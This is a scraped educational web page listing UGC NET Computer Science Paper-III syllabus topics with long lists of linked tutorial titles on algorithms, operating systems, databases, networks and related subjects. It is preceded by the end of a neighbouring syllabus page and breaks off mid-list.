message passing interface (MPI) libraries and calls Advanced architectures. Today’s fastest computers Mobile Computing : Mobile connectivity – Cells, Framework, wireless delivery technology and switching methods, mobile information access devices, mobile data internetworking standards, cellular data communication protocols, mobile computing applications Mobile databases – protocols, scope, tools and technology. M-business E – Technologies : Electronic Commerce – Framework, Media Convergence of Applications, Consumer Applications, Organisation Applications Electronic Payment Systems – Digital Token, Smart Cards, Credit Cards, Risks in Electronic Payment System, Designing Electronic Payment Systems Electronic Data Interchange (EDI) – Concepts, Applications, (Legal, Security and Privacy) issues, EDI and Electronic Commerce, Standardization and EDI, EDI Software Implementation, EDI Envelope for Message Transport, Internet – Based EDI Digital Libraries and Data Warehousing – Concepts, Types of Digital documents, Issues behind document Infrastructure, Corporate Data Warehouses Software Agents – Characteristics and Properties of Agents, Technology behind Software Agents (Applets, Browsers and Software Agents) Broadband Telecommunications – Concepts, Frame Relay, Cell Relay, Switched Multimegabit Data Service, Asynchronous Transfer Mode. Main concepts in Geographical Information System (GIS), E – cash, E – Business, ERP packages Data Warehousing – Data Warehouse environment, architecture of a data warehouse methodology, analysis, design, construction and administration Data Mining – Extracting models and patterns from large databases, data mining techniques, classification, regression, clustering, summarization, dependency modelling, link analysis, sequencing analysis, mining scientific and business data Windows Programming : Introduction to Windows programming – Win32, Microsoft Foundation Classes (MFC), Documents and views, Resources, Message handling in windows Simple Applications (in windows) – Scrolling, splitting views, docking toolbars, status bars, common dialogs Advanced Windows Programming – Multiple Document Interface (MDI), Multithreading. Object linking and Embedding (OLE). Active X controls. Active Template Library (ATL). Network programming Parallel Computing : Mobile Computing : E – Technologies : Windows Programming : Parallel Computing : Mobile Computing : E – Technologies : Windows Programming : Current Trends and Technology : Last Updated on : 9th July, 2018 Other Useful Links : UGC NET CS Notes according to syllabus of Paper-III (Core group) Previous years UGC NET CS solved papers Articles on Computer Science GATE CS Notes according to GATE 2019 syllabus Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above! My Personal Notes arrow_drop_up Save Load Comments room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

UGC NET CS Notes according to syllabus of Paper-III (Core group) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ UGC NET CS Notes according to syllabus of Paper-III (Core group) This page contains UGC NET Computer Science Preparation Notes / Tutorials on Algorithms, Programming and Data Structures, Operating Systems, Database Management Systems (DBMS), Computer Networks, Computer Organization and Architecture, Theory of Computation, Compiler Design, Digital Logic, Software Engineering, Machine Learning, and Artificial Intelligence and Fuzzy logic listed according to Paper-III (Core group) of the UGC NET CS syllabus. UGC NET Syllabus (Paper-III) Learn Practice External Resources Section 1: Data Structures and Algorithms Definition, Simple and Composite structures, Arrays, Lists, Stacks queues, Priority queues. Binary trees, B – trees, Graphs. Sorting and Searching Algorithms, Analysis of Algorithms, Interpolation and Binary Search, Asymptotic notations-big ohm, omega and theta. Average case analysis of simple programs like finding of a maximum of n elements. Recursion and its systematic removal. Quicksort – Non – recursive implementation with minimal stack storage. Design of Algorithms (Divide and Conquer, Greedy method, Dynamic programming, Back tracking, Branch and Bound). Lower bound theory, Non – deterministic algorithm, Non – deterministic programming constructs. Simple non-deterministic programs. NP – hard and NP – complete problems. Data Structures : Array Stack Queue Linked List Binary Tree Binary Search Tree Heap Tree Graph Data Structure Asymptotic Analysis of Algorithms : Analysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Analysis of Algorithms | Set 3 (Asymptotic Notations) Analysis of Algorithms | Set 4 (Analysis of Loops) Analysis of Algorithm | Set 5 (Amortized Analysis Introduction) Analysis of algorithms | little o and little omega notations What does ‘Space Complexity’ mean? Articles | Analysis of Algorithms Recurrence Relations : Analysis of Algorithm | Set 4 (Solving Recurrences) Divide and Conquer : Divide and Conquer | Set 1 (Introduction) Binary Search Why is Binary Search preferred over Ternary Search? Merge Sort Merge Sort for Linked Lists Merge Sort for Doubly Linked List How to make Mergesort to perform O(n) comparisons in best case? QuickSort Iterative Quick Sort QuickSort on Singly Linked List QuickSort on Doubly Linked List When does the worst case of Quicksort occur? Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Write a program to calculate pow(x,n) Median of two sorted arrays of same size Count Inversions in an array | Set 1 (Using Merge Sort) Divide and Conquer | Set 2 (Closest Pair of Points) Divide and Conquer | Set 5 (Strassen’s Matrix Multiplication) Sort a nearly sorted (or K sorted) array Search in an almost sorted array K-th Element of Two Sorted Arrays K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time) Searching and Sorting Greedy Techniques : Greedy Algorithms | Set 1 (Activity Selection Problem) Job Sequencing Problem | Set 1 (Greedy Algorithm) Greedy Algorithms | Set 3 (Huffman Coding) Greedy Algorithms | Set 4 (Efficient Huffman Coding for Sorted Input) Greedy Algorithms | Set 2 (Kruskal’s Minimum Spanning Tree Algorithm) Greedy Algorithms | Set 5 (Prim’s Minimum Spanning Tree (MST)) Greedy Algorithms | Set 6 (Prim’s MST for Adjacency List Representation) Applications of Minimum Spanning Tree Problem Greedy Algorithms | Set 7 (Dijkstra’s shortest path algorithm) Greedy Algorithms | Set 8 (Dijkstra’s Algorithm for Adjacency List Representation) Greedy Algorithm to find Minimum number of Coins Strongly Connected Components Greedy Algorithms Graph Based Algorithms : Graph and its representations Breadth First Search or BFS for a Graph Depth First Search or DFS for a Graph Applications of Depth First Search Detect Cycle in a Directed Graph Disjoint Set (Or Union-Find) | Set 1 (Detect Cycle in an Undirected Graph) Detect cycle in an undirected graph Topological Sorting Longest Path in a Directed Acyclic Graph Dynamic Programming | Set 23 (Bellman–Ford Algorithm) Dynamic Programming | Set 16 (Floyd Warshall Algorithm) Shortest Path in Directed Acyclic Graph Some interesting shortest path questions | Set 1 Shortest path with exactly k edges in a directed and weighted graph Biconnected Components Biconnected graph Articulation Points (or Cut Vertices) in a Graph Check if a graph is strongly connected | Set 1 (Kosaraju using DFS) Bridges in a graph Transitive closure of a graph Graph Algorithms Dynamic Programming : Dynamic Programming | Set 1 (Overlapping Subproblems Property) Dynamic Programming | Set 2 (Optimal Substructure Property) Dynamic Programming | Set 4 (Longest Common Subsequence) Dynamic Programming | Set 8 (Matrix Chain Multiplication) Dynamic Programming | Set 10 ( 0-1 Knapsack Problem) Dynamic Programming | Set 6 (Min Cost Path) Dynamic Programming | Set 25 (Subset Sum Problem) Dynamic Programming | Set 23 (Bellman–Ford Algorithm) Dynamic Programming | Set 16 (Floyd Warshall Algorithm) Total number of non-decreasing numbers with n digits Vertex Cover Problem | Set 2 (Dynamic Programming Solution for Tree) Smallest power of 2 greater than or equal to n Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming) Travelling Salesman Problem | Set 2 (Approximate using MST) Dynamic Programming Back Tracking : Backtracking | Introduction Backtracking | Set 1 (The Knight’s tour problem) Backtracking | Set 2 (Rat in a Maze) Backtracking | Set 3 (N Queen Problem) Backtracking | Set 4 (Subset Sum) Backtracking | Set 5 (m Coloring Problem) Backtracking | Set 6 (Hamiltonian Cycle) Backtracking | Set 7 (Sudoku) Backtracking | Set 8 (Solving Cryptarithmetic Puzzles) Backtracking | Set 9 (Magnet Puzzle) Partition of a set into K subsets with equal sum Write a program to print all permutations of a given string Tug of War Word Break Problem using Backtracking Print all palindromic partitions of a string Top 20 Backtracking Algorithm Interview Questions Branch and Bound : Branch and Bound | Set 1 (Introduction with 0/1 Knapsack) Branch and Bound | Set 2 (Implementation of 0/1 Knapsack) Branch and Bound | Set 3 (8 puzzle Problem) Branch And Bound | Set 4 (Job Assignment Problem) Branch and Bound | Set 5 (N Queen Problem) Branch And Bound | Set 6 (Traveling Salesman Problem) Searching and Sorting : Linear Search Linear Search vs Binary Search Selection Sort Bubble Sort Insertion Sort Heap Sort Radix Sort Counting Sort Non-deterministic Algorithms, NPC and NPH : NP-Completeness | Set 1 (Introduction) Proof that Hamiltonian Path is NP-Complete Data Structures : Array Stack Queue Linked List Binary Trees Binary Search Trees Balanced Binary Search Trees Heap Tree Traversals Asymptotic Analysis of Algorithms : Analysis of Algorithms Recurrence Relations : Analysis of Algorithms (Recurrences) Divide and Conquer : Divide and Conquer MergeSort Greedy Techniques : Greedy Algorithms Graph Shortest Paths Graph Minimum Spanning Tree Graph Based Algorithms : Graph Graph Traversals Dynamic Programming : Dynamic Programming Back Tracking : Backtracking Branch and Bound : Searching and Sorting : Searching Sorting Non-deterministic Algorithms, NPC and NPH : NP Complete Data Structures and Algorithms : Video – NPTEL lectures: Data Structure Video – GeeksforGeeks Videos Video – Lectures by Ravindrababu Ravula MIT – Introduction to Algorithms Book – CLRS Solutions Manual Visual – Data Structures and Algorithms. Notes – Big – O Notation Notes – Master Theorem Notes – Extended Master Theorem Notes – Master Theorem problems and answers Section 2: OOPs and Scripting Languages Object Oriented Programming and Design : Object, messages, classes, encapsulation, inheritance, polymorphism, aggregation, abstract classes, generalization as extension and restriction. Object oriented design. Multiple inheritance, metadata. Markup Languages : HTML, DHTML, XML Scripting, Java, Servelets, Applets. Object Oriented Programming and Design : Basic Concepts of Object Oriented Programming using C++ Why C++ is partially Object Oriented Language? Why Java is not a purely Object-Oriented Language? Introduction to Object Oriented Programming in JavaScript Commonly Asked OOP Interview Questions | Set 1 Object Oriented Programming | Set 1 Object Oriented Programming (OOP) Markup Languages : HTML | Basics HTML | Attributes HTML | Subscript and Superscript Tags HTML | Paragraph HTML | Text Formatting HTML | Quotations HTML | Style Tag HTML | Tables HTML | SVG-Basics HTML | Responsive Modal Login Form HTML | Class Attribute HTML | Lists HTML | Canvas Basics HTML | Iframes HTML | Responsive full page image using CSS HTML | Comments HTML | Links HTML5 | Video HTML | Images HTML5 | Audio HTML | Adding Youtube videos HTML | Heading HTML | Design Form HTML | Paragraph HTML | style attribute HTML | Doctypes HTML | Color Styles and HSL HTML | Object tag TAG ARCHIVES: HTML XML | Basics Displaying XML Using CSS Displaying XML Using XSLT Difference between Scripting and Programming Languages Java Programming Language Introduction to Java Servlets Servlet Collaboration Difference between Servlet and JSP Java Applet Basics Draw a ellipse and a rectangle in Java Applet Object Oriented Programming and Design : OOP Concepts Class and Object Markup Languages : HTML and XML Quizzes on Java Language Java Multiple Choice Questions OOPs and Scripting Languages : Section 3: Programming Languages Concepts and TOC Programming Languages Concepts : Programming language concepts, paradigms and models. Data: Data types, Operators, Expressions, Assignment. Flow of Control. Control structures, I / O statements, User – defined and built – in functions, Parameter passing. Principles, classes, inheritance, class hierarchies, polymorphism, dynamic binding, reference semantics and their implementation. Principles, functions, lists, types and polymorphisms, higher order functions, lazy evaluation, equations and pattern matching. Principles, horn clauses and their execution, logical variables, relations, data structures, controlling the search order, program development in prolog, implementation of prolog, example programs in prolog. Principles of parallelism, coroutines, communication and execution. Parallel Virtual Machine (PVM) and Message Passing Interface (MPI) routines and calls. Parallel programs in PVM paradigm as well as MPI paradigm for simple problems like matrix multiplication. Preconditions, post-conditions, axiomatic approach for semantics, correctness, denotational semantics. Theory of Computation : Finite Automata, Pushdown Automata. Non-determinism and NFA, DPDA, and PDAs and languages accepted by these structures. Grammars, Languages – types of grammars – type 0, type 1, type 2, and type 3. The relationship between types of grammars, and finite machines. Pushdown automata and Context Free Grammars. Lexical Analysis-regular expressions and regular languages. LEX package on Unix. Conversion of NFA to DFA. Minimizing the number of states in a DFA Compilation and Interpretation. Compiler Design : Compiler structure, compiler construction tools, compilation phases, Bootstrap compilers. Context free grammars. Parsing and parse trees. Representation of parse (derivation) trees as rightmost and leftmost derivations. Bottom up parsers-shift-reduce, operator precedence, and LR. YACC package on Unix system. Top down parsers-left recursion and its removal. Recursive descent parser. Predictive parser Intermediate codes – Quadruples, triples. Intermediate code generation, code generation. Code optimization. Programming Languages Concepts : Theory of Computation : Introduction of Theory of Computation Finite Automata Introduction Chomsky Hierarchy Regular Expressions, Regular Grammar and Regular Languages Pumping Lemma Designing Finite Automata from Regular Expression NFA with epsilon move to DFA Conversion Conversion from NFA to DFA Minimization of DFA Regular expression from finite automata Union & Intersection of Regular languages with CFL Mealy and Moore Machines DFA of a string with at least two 0’s and at least two 1’s Star Height of Regular Expression/Language Pushdown Automata Pushdown Automata Acceptance by Final State Construct Pushdown Automata for given languages Construct Pushdown Automata for all length palindrome Closure Properties of Context Free Languages Ambiguity in Context free Grammar and Context free Languages Simplifying Context Free Grammars Converting Context Free Grammar to Chomsky Normal Form Converting Context Free Grammar to Greibach Normal Form Relationship between grammar and language Compiler Design : Compiler vs Interpreter Introduction of Compiler design Phases of a Compiler Symbol Table in Compiler Error Handling in Compiler Design Error detection and Recovery in Compiler Lexical Analysis C program to detect tokens in a C program Flex (Fast Lexical Analyzer Generator) Classification of Context Free Grammars Ambiguous Grammar Why FIRST and FOLLOW? FIRST Set in Syntax Analysis FOLLOW Set in Syntax Analysis First and Follow sets of given grammar Introduction to Syntax Analysis Parsing | Set 1 Parsing | Set 2 Parsing | Set 3 Shift Reduce Parser in Compiler Classification of top down parsers Operator grammar and precedence parser Syntax Directed Translation Runtime Environments Intermediate Code Generation Three address code in Compiler Code Optimization Introduction of Object Code Data flow analysis in Compiler Programming Languages Concepts : Theory of Computation : Regular languages and finite automata Practice problems on finite automata Practice problems on finite automata | Set 2 Context free languages and Push-down automata Automata Theory | Set 1 Automata Theory | Set 2 Automata Theory | Set 3 Automata Theory | Set 4 Automata Theory | Set 5 Automata Theory | Set 6 Compiler Design : MCQ on Memory allocation and compilation process Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Compiler Theory | Set 1 Compiler Theory | Set 2 Programming Languages Concepts : Theory of Computation : Video – NPTEL TOC Lectures Video – TOC Lectures by Ravindrababu Ravula Notes – NFA and DFA Notes – Non Regular language Notes – PDA Compiler Design : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Bivas Mitra IITgp Notes – LR Parsing Notes – Syntax Directed Translation Notes – Intermediate Code Generation Section 4: Operating Systems Introduction, Memory management, Support for concurrent process, Scheduling, System deadlock, Multiprogramming system, I/O management, Distributed operating systems, Study of Unix and Windows NT. Processes, threads, CPU scheduling : What happens when we turn on computer? Introduction of Operating System Types of Operating Systems Dual Mode operations in OS 32-bit and 64-bit operating systems Real time systems Process Management | Introduction States of a process Process Table and Process Control Block (PCB) Process Scheduler Difference between dispatcher and scheduler Process Management | CPU Scheduling Program for FCFS Scheduling | Set 1 Program for FCFS Scheduling | Set 2 (Processes with different arrival times) Convoy Effect in Operating Systems Program for preemptive priority CPU scheduling Program for Round Robin scheduling | Set 1 Program for Shortest Job First (or SJF) scheduling | Set 1 (Non- preemptive) Program for Shortest Job First (SJF) scheduling | Set 2 (Preemptive) Shortest Job First scheduling with predicted burst time Highest Response Ratio Next (HRRN) Scheduling Program for Priority Scheduling | Set 1 Priority Scheduling with different arrival time | Set 2 Multilevel Queue Scheduling Multilevel Feedback Queue Scheduling Multiple-Processor Scheduling Measure the time spent in context switch Starvation and Aging in Operating Systems Introduction of System Call Operating System | Thread Threads and its types Multi threading models Benefits of Multithreading Process-based and Thread-based Multitasking User Level thread Vs Kernel Level thread Microkernel Monolithic Kernel and key differences from Microkernel Difference between multitasking, multithreading and multiprocessing Interprocess communication, concurrency and synchronization : Process Synchronization | Introduction Critical Section Inter Process Communication IPC using Message Queues IPC through shared memory Semaphores in operating system Mutex vs Semaphore Lock variable synchronization mechanism Peterson’s Algorithm for Mutual Exclusion | Set 1 (Basic C implementation) Peterson’s Algorithm for Mutual Exclusion | Set 2 (CPU Cycles and Memory Fence) Peterson’s Algorithm (Using processes and shared memory) Readers-Writers Problem | Set 1 (Introduction and Readers Preference Solution) Reader-Writers solution using Monitors Process Synchronization | Monitors Dining-Philosophers Solution Using Monitors Dining Philosopher Problem Using Semaphores Dekker’s algorithm Bakery Algorithm Priority Inversion : What the heck ! What’s difference between Priority Inversion and Priority Inheritance ? Deadlock : Process Management | Deadlock Introduction Deadlock Prevention And Avoidance Deadlock Detection And Recovery Resource Allocation Graph (RAG) Banker’s Algorithm Program for Banker’s Algorithm | Set 1 (Safety Algorithm) Banker’s Algorithm : Print all the safe state Deadlock detection algorithm Main memory management : Mapping virtual address to physical addresses Memory Management |Partition Allocation Method Paging Page Table Entries Inverted Page Table Segmentation Program for First Fit algorithm in Memory Management Program for Next Fit algorithm in Memory Management Working with Shared Libraries | Set 1 Static and Dynamic Libraries | Set 1 Buddy System Allocating kernel memory Virtual memory : Virtual Memory Secondary memory – Hard disk drive Page Fault Handling Page Replacement Algorithms Program for Optimal Page Replacement Algorithm Techniques to handle Thrashing What exactly Spooling is all about? Overlays in Memory Management Swap Space I/O Management and Distributed OS : File Systems File Directory | Path Name File Allocation Methods Difference between FAT32, exFAT, and NTFS File System Disk Scheduling Algorithms CATEGORY ARCHIVES: OPERATING SYSTEMS Last Minute Notes – Operating Systems Study of Unix and Windows NT : Processes, threads, CPU scheduling : Process Management CPU Scheduling Inter-process communication, concurrency and synchronization : Concurrency and synchronization Deadlock : Deadlock Main memory management : Memory Management Virtual memory : Virtual Memory | Questions I/O Management and Distributed OS : Input Output Systems Study of Unix and Windows NT : Unix Operating Systems : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – VirginiaTech Univ. Web resource Notes – Galvin Lecture Slides Book – William Stallings Practice Problems and Solutions Notes – Virtual Memory and Cache Notes – Segmentation and Paging Notes – Some Interesting problems on Virtual memory Section 5: Database Management Systems Database Concepts, ER diagrams, Data Models, Design of Relational Database Normalisation, SQL and QBE, Query Processing and Optimisation, Centralised and Distributed Database, Security, Concurrency and Recovery in Centralised and Distributed Database Systems Object Oriented Database Management Systems (Concepts, Composite objects, Integration with RDBMS applications), ORACLE. Introduction and ER model : Database Management System – Introduction | Set 1 Database Management System Introduction | Set 2 (3-Tier Architecture) DBMS Architecture 2-Level, 3-Level Need for DBMS Advantages of DBMS over File system Data Abstraction and Data Independence ER Model Recursive Relationships Minimization of ER Diagram Enhanced ER Model Mapping from ER Model to Relational Model Data Models and Relational Model : Relational Model Relational Algebra – Overview DBMS | Anomalies in Relational Model Relational Model Introduction and Codd Rules Keys in Relational Model (Candidate, Super, Primary, Alternate and Foreign) Relational Algebra-Basic Operators Relational Algebra – Extended Operators DBMS | How to solve Relational Algebra problems for GATE -1 DBMS | How to solve Relational Algebra problems for GATE -2 Database design (integrity constraints, normal forms) : Database Normalization | Introduction Database Normalization | Normal Forms Functional Dependency and Attribute Closure Finding Attribute Closure and Candidate Keys using Functional Dependencies Number of possible Superkeys Lossless Decomposition Dependency Preserving Decomposition Lossless Join and Dependency Preserving Decomposition DBMS | How to find the highest normal form of a relation Equivalence of Functional Dependencies Armstrong’s Axioms in Functional Dependency Canonical Cover Denormalization in Databases Concurrency and Recovery : Concurrency Control -Introduction Database Recovery Techniques ACID Properties in DBMS Log based recovery Transaction Isolation Levels in DBMS Conflict Serializability Precedence Graph For Testing Conflict Serializability How to test if two schedules are View Equal or not ? Recoverability of Schedules Deadlock in DBMS Starvation in DBMS Concurrency Control Protocols | Lock Based Protocol Concurrency Control Protocol | Two Phase Locking (2-PL)-I Concurrency Control Protocol | Two Phase Locking (2-PL)-II Concurrency Control Protocol | Two Phase Locking (2-PL)-III Concurrency Control Protocol | Thomas Write Rule Concurrency Control Protocols | Timestamp Ordering Protocols Concurrency Control Protocol | Multiple Granularity Locking Concurrency Control Protocol | Graph Based Protocol Introduction to TimeStamp and Deadlock Prevention Schemes SQL and QBE : Structured Query Language (SQL) Inner VS Outer Join Having Vs Where Clause Database Objects Nested Queries in SQL SQL Tutorial Oracle : Introduction and ER model : ER and Relational Models Database Design (Normal Forms) Transactions and concurrency control SQL Database Management Systems : Video – NPTEL Lectures Notes – Lecture Slides Silberschatz, Korth and Sudarshan Notes – Lecture Slides Raghu Ramakrishnan and Johannes Gehrke Notes – Stanford DBMS course Lecture Slides Notes – Jeff Ullman’s Lecture Slides Notes – Canonical Cover Section 6: Computer Organization and Microprocessor Combinational Circuit Design, Sequential Circuit Design Hardwired and Micro Programmed processor design, Instruction formats, Addressing modes, Memory types and organisation, Interfacing peripheral devices, Interrupts Microprocessor architecture, Instruction set and Programming (8085, P – III / P – IV), Microprocessor applications. Combinational Circuit Design : Half Adder Full Adder Half Subtractor Full Subtractor Half Adder and Half Subtractor using NAND NOR gates Encoders and Decoders Encoder Binary Decoder Combinational circuits using Decoder Multiplexers Carry Look-Ahead Adder Parallel Adder & Parallel Subtractor BCD Adder Magnitude Comparator BCD to 7 Segment Decoder Programmable Logic Array Programming Array Logic Read-Only Memory (ROM) Sequential Circuit Design : Introduction of Sequential Circuits Flip-flop types and their Conversion Synchronous Sequential Circuits Counters n-bit Johnson Counter Ripple Counter Design counter for given sequence Master Slave JK Flip Flop Asynchronous Sequential Circuits Shift Registers Design 101 sequence detector Amortized analysis for increment in counter Hardwired and Microprogrammed processor Design : Hardwired v/s Micro-programmed Control Unit Instruction Formats and Addressing Modes : Von Neumann architecture Basic Computer Instructions Instruction Formats (Zero, One, Two and Three Address Instruction) Problem Solving on Instruction Format Addressing Modes Machine Instructions Difference between CALL and JUMP instructions Simplified Instructional Computer (SIC) Flynn’s taxonomy Generations of computer Pipelining | Set 1 (Execution, Stages and Throughput) Pipelining | Set 2 (Dependencies and Data Hazard) Pipelining | Set 3 (Types and Stalling) Different Instruction Cycles Micro-Operation Memory organization and Interrupts : Cache Memory Cache Organization | Introduction What’s difference between CPU Cache and TLB? Types of computer memory (RAM and ROM) Different Types of RAM I/O Interface (Interrupt and DMA Mode) Priority Interrupts | (S/W Polling and Daisy Chaining) Asynchronous input output synchronization Clusters In Computer Organisation Microprocessor and 8085 : Microprocessor Tutorials Computer Organization and Microprocessor : Digital Logic Computer Organization and Architecture Microprocessor Computer Organization and Microprocessor : Video – NPTEL Lectures: Digital logic Video – Lectures by Ravindrababu Ravula: Digital logic Video – NPTEL Lectures: CO Notes – Pipelining Notes – Cache Memory Notes – Cache Associativity Section 7: Data Transmission and Computer Networks Analog and Digital transmission, Asynchronous and Synchronous transmission, Transmission media, Multiplexing and Concentration, Switching techniques, Polling. Topologies, Networking Devices, OSI Reference Model, Protocols for – (i) Data link layer, (ii) Network layer, (iii) Transport layer, TCP / IP protocols, Networks security, Network administration. Type of Transmission and Media : Types of Transmission Media Data Communication | Transmission Impairment Transmission Modes in Computer Networks (Simplex, Half-Duplex and Full-Duplex) Switching Techniques and Polling : Switching techniques: Message switching Circuit Switching Packet Switching and Delays Circuit Switching VS Packet Switching Introduction of Computer Network and OSI Model : Basics of Computer Networking Network Topologies Types of area networks – LAN, MAN and WAN MANET: Mobile Ad hoc Network Types of Transmission Media Transmission Modes in Computer Networks (Simplex, Half-Duplex and Full-Duplex) Collision Domain and Broadcast Domain Redundant link problems Digital Subscriber Line (DSL) What is Scrambling? Difference between Unipolar, Polar and Bipolar Line Coding Schemes Analog to digital conversion Digital to Analog Conversion Analog to Analog Conversion (Modulation) Difference between Broadband and Baseband Transmission Let’s experiment with Networking Layers of OSI Model TCP/IP Model Network Devices (Hub, Repeater, Bridge, Switch, Router, Gateways and Brouter) Data Link Layer : Multiple Access Protocols P2P(Peer To Peer) File Sharing Framing In Data Link Layer LAN Technologies | ETHERNET Ethernet Frame Format Difference between Byte stuffing and Bit stuffing Hamming Code Carrier sense multiple access (CSMA) Controlled Access Protocols Back-off Algorithm for CSMA/CD Collision Detection in CSMA/CD Efficiency of CSMA/CD Efficiency Of Token Ring Computer Networks | Error Detection Stop and Wait ARQ Sliding Window Protocol | Set 1 (Sender Side) Sliding Window Protocol | Set 2 (Receiver Side) Sliding Window Protocol | Set 3 (Selective Repeat) Sliding Window protocols Summary With Questions Program to remotely Power On a PC over the internet using the Wake-on-LAN protocol Program to calculate the Round Trip Time (RTT) Introduction of MAC Address Collision Avoidance in wireless networks Maximum data rate (channel capacity) for noiseless and noisy channels Network Layer : Internetworking Line Configuration in Computer Networks Difference between Unicast, Broadcast and Multicast Collision Domain and Broadcast Domain IP Addressing | Introduction and Classful Addressing Network Layer | Introduction and IPv4 Datagram Header Network Layer | Ipv4 Datagram Fragmentation and Delays Fragmentation at Network Layer Internet Protocol v6 | IPv6 Internet Protocol version 6 (IPv6) Header IP Addressing | Classless Addressing Supernetting Computer Networks | Longest Prefix Matching in Routers Program to determine class, Network and Host ID of an IPv4 address C Program to find IP Address, Subnet Mask & Default Gateway Network address translation (NAT) Types of Network address translation (NAT) Classification of Routing Algorithms – Set 1 Types of routing – Set 2 Classes of routing protocols – Set 3 Distance vector routing v/s Link state routing Fixed and Flooding Routing algorithms Routing v/s Routed Protocols Unicast Routing – Link State Routing Routing Protocols Set 1 (Distance Vector Routing) Route Poisoning and Count to infinity problem Onion Routing Router on a stick Internet Control Message Protocol (ICMP) | Computer Networks Hot Standby Router Protocol (HSRP) OSPF protocol fundamentals OSPF protocol States OSPF router roles and configuration Root Bridge Election in Spanning Tree Protocol Types of Spanning Tree Protocol (STP) EIGRP fundamentals Features of Enhanced Interior Gateway Routing Protocol (EIGRP) Routing Information Protocol (RIP) Link state advertisement (LSA) Administrative Distance (AD) and Autonomous System (AS) Circuit Switching Packet Switching and Delays Differences between Virtual Circuits & Datagram Networks Computer Network | Circuit Switching VS Packet Switching Traceroute How ARP works? ARP, Reverse ARP(RARP), Inverse ARP(InARP), Proxy ARP and Gratuitous ARP Packet flow in the same network Packet flow in different network What’s difference between Ping and Traceroute? Transport Layer : Transport Layer responsibilities Congestion Control Leaky Bucket Algorithm TCP Congestion Control TCP 3-Way Handshake Process TCP Connection Establishment TCP Connection Termination Error Control in TCP TCP Timers User Datagram Protocol (UDP) Multiplexing and Demultiplexing in Transport Layer Network Security : Basic Network Attacks Types of Viruses Introduction to Firewall Deniel of Service and Prevention Digital Signatures and Certificates LZW (Lempel–Ziv–Welch) Compression technique RC4 Encryption Algorithm RSA Algorithm in Cryptography RSA Algorithm using Multiple Precision Arithmetic Library Weak RSA decryption with Chinese-remainder theorem Implementation of Diffie-Hellman Algorithm DNA Cryptography Port security Unicode Message Authentication Codes How message authentication code works? Hash Functions in System Security The CIA triad Image Steganography Access-lists (ACL) Last Minute Notes – Computer Networks Data Transmission and Computer Networks : Computer Networks Data Link Layer Network Layer IP Addressing Transport Layer Application Layer Network Security Data Transmission and Computer Networks : Video – NPTEL Lectures Video – Lectures by Ravindrababu Ravula Notes – Lecture Notes IIT Kanpur Notes – Web Resources on Computer Networks by Tanenbaum Visual – Sliding Window Animation Section 8: Software Engineering Software development models, Requirement analysis and specifications, Software design Programming techniques and tools Software validation and quality assurance techniques Software maintenance and advanced concepts, Software management. Software Models : Classical Waterfall Model Iterative Waterfall Model Incremental process model Prototyping Model COCOMO Model Spiral Model Rapid application development model (RAD) RAD Model vs Traditional SDLC Requirement Analysis and Specifications : Classification of Software Requirements Project size estimation techniques Requirements Engineering Process Programming Techniques and Tools : Software Validation and QAT : Classification of Software Software Testing | Basics Black box testing White box Testing Requirements Elicitation Challenges in eliciting requirements Capability maturity model (CMM) Debugging Software Maintenance and Management : Project Management Process System configuration management Software Engineering : Software Engineering Software Engineering : Section 9: Computer Graphics Display systems, Input devices, 2D Geometry, Graphic operations, 3D Graphics, Animation, Graphic standard, Applications. Concepts, Storage Devices, Input Tools, Authoring Tools, Application, Files. Display System and Input Devices : Vector vs Raster Graphics Segments in Computer Graphics A-Buffer Method Z-Buffer or Depth-Buffer method Back-Face Detection Method Graphics Operations and 3D Graphics : 2D Transformation in Computer Graphics | Set 1 (Scaling of Objects) 2D Transformation | Rotation of objects Point Clipping Algorithm in Computer Graphics Line 